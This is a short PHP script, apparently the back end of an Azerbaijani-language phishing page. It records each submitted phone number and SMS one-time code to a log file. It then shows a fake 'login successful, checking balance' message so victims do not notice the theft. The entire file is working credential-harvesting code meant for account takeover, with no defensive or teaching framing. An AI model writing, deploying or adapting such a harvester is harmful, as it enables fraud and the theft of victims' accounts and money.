<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = htmlspecialchars($_POST['phone']);
    $otp = htmlspecialchars($_POST['otp']);

    $data = "Mobil nömrə: $phone | SMS kod: $otp\n";

    file_put_contents("log.txt", $data, FILE_APPEND | LOCK_EX);

    echo "<!DOCTYPE html>
    <html lang='az'>
    <head>
      <meta charset='UTF-8'>
      <title>Təbriklər</title>
      <style>
        body {
          font-family: 'Segoe UI', sans-serif;
          background-color: #f2f2f2;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
        }
        .message-box {
          background-color: white;
          padding: 30px;
          border-radius: 12px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.1);
          text-align: center;
        }
        h2 {
          color: #4CAF50;
        }
        p {
          color: #333;
        }
      </style>
    </head>
    <body>
      <div class='message-box'>
        <h2>Giriş uğurla tamamlandı</h2>
        <p>Balans yoxlanılır...</p>
      </div>
    </body>
    </html>";
}
?>
